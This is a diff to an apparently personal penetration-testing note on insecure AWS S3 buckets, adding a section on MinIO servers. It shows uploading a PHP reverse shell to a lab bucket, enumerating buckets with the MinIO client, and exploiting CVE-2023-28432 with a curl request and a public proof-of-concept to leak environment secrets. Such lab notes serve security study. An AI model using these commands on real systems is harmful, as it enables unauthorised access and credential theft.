@@ -1,6 +1,7 @@
-# Aws Buckets
+# AWS Buckets & S3-Compatible (MinIO)
 
 * AWS provides the ability for clients to store a lot of data using a service called Simple Storage Service(S3).
+* **MinIO** is S3-compatible object storage; it may listen on non-standard ports (e.g. 54321) and can be detected by the same tooling as S3.
 * Files are stored on what are called buckets and these buckets can have insecure permissions:
 
 ## Here’s a break down of the following permissions:
@@ -97,4 +98,37 @@ bucketname.region-name.amazonaws.com/file-name
 ```
 aws --endpoint=http://s3.thetoppers.htb s3 cp php-reverse-shell.php s3://thetoppers.htb 
 upload: ./php-reverse-shell.php to s3://thetoppers.htb/php-reverse-shell.php
+```
+
+---
+
+## MinIO (S3-compatible)
+
+### Identification
+
+* **Nmap:** `Server: MinIO` and `X-Amz-Id-2`, `X-Amz-Request-Id` in HTTP responses; Golang net/http fingerprint.
+* **Nuclei:** `nuclei -u target:54321 -as -rl 15 -c 50` can tag `aws-bucket-service`, `s3-detect`, `waf-detect:aws`.
+* **Browser redirect:** MinIO console may redirect to another port (e.g. 9001); if that port is not open, use IP or API directly.
+* **Invalid bucket probe:** `http://TARGET:54321/%c0` often returns `InvalidBucketName` / "bucket is not valid", confirming S3-compatible API.
+* **crossdomain.xml:** `http://TARGET:54321/crossdomain.xml` may exist (Flash cross-domain policy).
+
+### mc (MinIO Client)
+
+```bash
+# Add alias (use IP if hostname redirects to closed port)
+mc alias set myminio http://TARGET_IP:54321
+# Enter Access Key / Secret Key (or leave blank for anonymous)
+
+# List buckets (may get Access Denied without creds)
+mc ls myminio
+```
+
+### CVE-2023-28432 (MinIO info leak)
+
+Bootstrap endpoint can leak env/config. Use **IP** in the exploit URL if the hostname redirects to a port you can’t reach:
+
+```bash
+curl http://TARGET_IP:54321/minio/bootstrap/v1/verify
+# Exploit PoC: https://github.com/Chocapikk/CVE-2023-28432
+python3 exploit.py --verbose -u http://TARGET_IP:54321
 ```
